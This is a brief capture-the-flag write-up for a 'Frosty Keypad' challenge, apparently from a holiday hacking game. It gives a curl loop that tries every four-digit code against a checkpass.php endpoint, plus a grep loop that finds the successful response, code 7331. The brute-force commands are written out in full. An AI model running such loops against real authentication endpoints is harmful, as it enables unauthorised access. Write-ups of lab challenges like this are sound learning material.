# Frosty Keypad

Looped through all codes:

```
cd /tmp;
for i in $(seq -f "%04g" 0 9999); do curl "https://keypad.elfu.org/checkpass.php?i=$i&resourceId=d3674df0-8e3e-452a-a467-b519a2e4cc19" > $i.txt ; done
```

Since the wrong responses return a JSON with `success: false`; I grepped `true`:
Read the code:

```
while true ; do ls *.txt -l | wc -l ; grep true *.txt ; sleep 1; done
```

After some minutes, the output was:


```
10000
7331.txt:{"success":true,"resourceId":"d3674df0-8e3e-452a-a467-b519a2e4cc19","hash":"dbeb5e3164ac5d4802018f80289d0f2622a127ce1423f469fe94446207808833","message":"Valid  Code!"}
```

Enter 7331 in the pad and get in!
